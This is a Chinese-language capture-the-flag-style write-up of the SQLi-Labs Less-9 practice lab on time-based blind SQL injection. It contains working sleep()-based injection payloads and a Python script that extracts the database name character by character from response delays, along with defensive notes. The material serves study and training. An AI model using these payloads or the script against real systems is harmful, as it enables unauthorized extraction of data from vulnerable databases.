SQLi-Labs Less-9

2026年9月25日 SQLi-Labs Web安全 SQL注入 时间盲注

一、题目信息

  • 题目名称：SQLi-Labs Less-9 (GET - Blind - Time based. - Single Quotes)
  • 题目平台：SQLi-Labs 本地靶场
  • 题目类型：Web安全 / SQL注入 / 时间盲注
  • 靶场链接：http://localhost:8081/Less-9/（本地环境）
  • 涉及工具：Chrome浏览器、Python（requests库、time库）

二、解题步骤

1. 分析题目考什么

本题的核心考点是时间盲注（Time-Based Blind SQL Injection）。页面不仅没有数据回显，没有报错信息，甚至也没有布尔盲注那种“真/假”状态差异。无论输入什么，页面永远只返回同一个静态页面。攻击者必须利用 MySQL 的 sleep() 函数，通过判断页面响应时间的长短来推断条件真假，从而逐字符猜解数据。

2. 怎么想（破题思路）

  • 尝试 ?id=1' 无法确认闭合方式，尝试 ?id=1' --+ 页面正常。
  • 尝试 ?id=1' and 1=1 --+ 与 ?id=1' and 1=2 --+，页面回显完全一致，无法通过视觉判断真假。
  • 思路：利用 if(条件, sleep(5), 0)。如果条件为真，页面加载延迟 5 秒；如果为假，页面立即加载。
  • 使用 Python 脚本记录每次请求的耗时，若耗时超过阈值（如 2.5 秒），则条件为真。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：惯性思维用真假页面判断

踩坑情况：用 and 1=1 和 and 1=2 测试，页面都返回 "You are in..."，无法判断。

原因分析：Less-9 的 PHP 代码只输出一句静态提示，完全忽略了 SQL 查询的结果和状态。

改进方式：必须引入 sleep() 函数，用“时间”作为唯一的信息传递通道。

踩坑记录二：Python 脚本请求超时崩溃

踩坑情况：脚本运行到一半报错，或者因为网络波动导致判断错误。

原因分析：网络延迟本身就有波动。如果没有在 requests 中设置合理的 timeout（超时时间），脚本会卡死。如果阈值（如 >2.5s）设置不当，也会误判。

改进方式：给 requests 设置 timeout=10，并在代码中加入 try...except 容错。阈值建议设置为 sleep 时间 / 2（例如 sleep 3秒，阈值设为 1.5秒）。

详细实操步骤（Python 脚本爆破）

第一步：手动验证时间盲注

?id=1' and if(1=1, sleep(5), 0) --+   (页面会明显卡顿 5 秒)
?id=1' and if(1=2, sleep(5), 0) --+   (页面瞬间加载)

逐字解析：if(条件, 真值, 假值) 是 MySQL 的逻辑判断函数。sleep(5) 会让数据库沉睡 5 秒。如果条件为真，页面请求会等待 5 秒；如果条件为假，则立即返回。

第二步：编写 Python 脚本自动化

由于肉眼无法判断毫秒级差异，必须用脚本记录时间。

import requests
import time

url = "http://localhost:8081/Less-9/?id=1'"

def get_database_name(length):
    name = ""
    for i in range(1, length + 1):
        for ascii_val in range(32, 127):
            payload = f" and if(ascii(substr(database(),{i},1))={ascii_val}, sleep(3), 0) --+"
            start = time.time()
            try:
                requests.get(url + payload, timeout=10)
            except:
                pass
            end = time.time()
            if end - start > 1.5:  # 阈值设为 sleep 时间的一半
                name += chr(ascii_val)
                print(f"[+] 已猜解: {name}")
                break
    return name

print("[*] 开始爆破...")
db_name = get_database_name(8)
print(f"[*] 数据库名称为: {db_name}")

代码逐字深度解析：

  • time.time()：获取当前时间戳，用于计算请求耗时。
  • requests.get(url + payload, timeout=10)：发送请求，并设置超时时间防止卡死。
  • if end - start > 1.5:：如果耗时超过 1.5 秒，说明触发了 sleep(3)，条件为真。
  • ascii(substr(database(),{i},1))={ascii_val}：逐字符猜解数据库名。

预期结果：脚本输出 security。

4. 怎么迁移（跨领域联想）

  • 网络延迟检测与DDoS：时间盲注的原理与网络延迟测试类似。在DDoS攻击中，攻击者通过制造大量请求让服务器响应变慢，从而判断服务器是否过载。
  • 安全开发（SDL）：禁用数据库的 sleep 函数、使用参数化查询、限制数据库权限，是防御时间盲注的有效手段。
  • 自动化测试与系统监控：自动化测试脚本通过检测接口响应时间来判断系统性能，与时间盲注的脚本逻辑异曲同工。

三、名词大全与原理深度复盘

1. 时间盲注（Time-Based Blind SQLi）

盲注的终极形态。在页面没有任何数据回显、报错和状态差异时，利用数据库的 sleep() 函数制造延迟，通过测量 HTTP 响应时间的长短来推断 SQL 条件真伪的技术。

2. if(cond, true_val, false_val) 函数

MySQL 的逻辑判断函数。如果条件 cond 成立，返回 true_val；否则返回 false_val。在时间盲注中，通常配合 sleep() 使用。

3. sleep(seconds) 函数

让数据库进程暂停执行指定的秒数。攻击者利用它作为“信号发生器”，用“卡顿”来代表“真”。

4. Python requests 超时机制

由于时间盲注会主动制造延迟，如果不设置 timeout，Python 脚本会一直卡在 socket 等待状态。必须设置合理的超时时间，并配合时间戳计算来判断延迟。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Less-8（布尔盲注）的区别：布尔盲注页面有“真/假”两种不同的视觉反馈（回显不同文本）；时间盲注页面视觉反馈完全一致，只能靠“响应时间”区分真假。
  • 与 Less-5/6（报错注入）的区别：报错注入会输出报错信息；时间盲注完全“静默”。

2. 这种题目的出现原因

开发人员可能屏蔽了所有的输出（数据和报错），以为这样就万无一失。但他们忽略了数据库执行的“副作用”——比如 sleep() 导致的延迟。只要数据库还会执行用户输入，这种副作用就能成为攻击者获取信息的通道。

3. 这种应用在实际中如何体现？

时间盲注常用于探测极其隐蔽的、没有任何回显的注入点。在真实红蓝对抗中，由于时间盲注需要发送大量请求且每次都有延迟，非常耗时，通常只在没有其他办法时使用。SQLMap 工具的 `--time-sec` 参数就是专门针对时间盲注的。

4. 如何抽象理解概念（大白话理解）

把数据库比作一个在厚墙后面的“密室守卫”：

  • 联合注入：守卫直接通过窗户把钥匙（数据）扔给你。
  • 报错注入：你问错话，守卫大声骂你，骂声里带着钥匙的线索。
  • 布尔盲注：守卫不扔钥匙也不骂人，但你对他说“1+1=2”他点头（页面回显），“1+1=3”他摇头（空白页）。
  • 时间盲注：守卫被绑住了，不能点头也不能摇头，也无法发声。你对他喊“如果钥匙在左边，你就原地转 5 圈再回来（sleep 5）”。如果他真的转了 5 圈才回来，你就知道钥匙在左边。
